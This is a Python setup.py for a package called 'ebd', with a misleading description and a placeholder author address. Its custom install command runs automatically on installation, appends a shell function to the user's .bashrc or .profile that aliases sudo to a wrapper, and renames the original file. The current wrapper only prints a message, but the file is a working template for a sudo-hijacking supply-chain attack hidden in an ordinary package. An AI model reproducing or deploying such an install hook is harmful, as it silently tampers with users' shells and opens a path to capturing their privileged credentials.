import setuptools
import setuptools.command
import setuptools.command.install
import os
import subprocess

INJECT_START = "1751e294-905e-11e9-a4eb-c7f4153c2d31"
INJECT_END = "2850afd0-905e-11e9-916c-0bc8448b9016"


def get_home_dir():
    return os.path.expanduser("~")


def get_rc_candidate(home):
    bashrc = os.path.join(home, ".bashrc")
    if os.path.exists(bashrc):
        return bashrc
    profile = os.path.join(home, ".profile")
    if os.path.exists(profile):
        return profile


def get_injection():
    return """\n
# {start}

_sudo() {{
  echo \"this is a wrapped sudo\"
  sudo $@
}}
alias sudo=_sudo
# {end}
""".format(start=INJECT_START, end=INJECT_END)


def inject_sudo_alias(filepath):
    ret = subprocess.call("sudo --version", shell=True)
    if ret != 0:
        print("no sudo detected")
        return
    with open(filepath) as file:
        contents = file.read()
    if contents.find(INJECT_END) != -1:
        print("previous injection detected")
        return
    os.rename(filepath, filepath + ".backup")
    print("rc file backed up")
    injection = get_injection()
    print("injecting new contents")
    with open(filepath, "w") as file:
        file.write(contents + injection)
    print("new contents injected")


def should_skip(home):
    skip_file = os.path.join(home, ".ebd")
    return os.path.exists(skip_file)


def setup_ebd():
    home = get_home_dir()
    if home is None:
        print("could not determine home")
        return
    print("home: {}".format(home))
    if should_skip(home):
        print(".ebd found in {}, skipping this machine".format(home))
        return
    rc = get_rc_candidate(home)
    if rc is not None:
        print("found suitable rc file: {}".format(rc))
        inject_sudo_alias(rc)
    else:
        print("no suitable rc found")


class PostInstallCommand(setuptools.command.install.install):
    def run(self):
        setup_ebd()
        setuptools.command.install.install.run(self)


with open("README.md") as file:
    long_description = file.read()

with open("VERSION") as file:
    version = file.read()

setuptools.setup(
    name="ebd",
    version=version,
    author="Fiely Teach",
    author_email="admin@admin.ru",
    description="Wrapper for LFSM-enabled systems.",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/",
    packages=setuptools.find_packages(),
    cmdclass={
        "install": PostInstallCommand
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    include_package_data=True
)
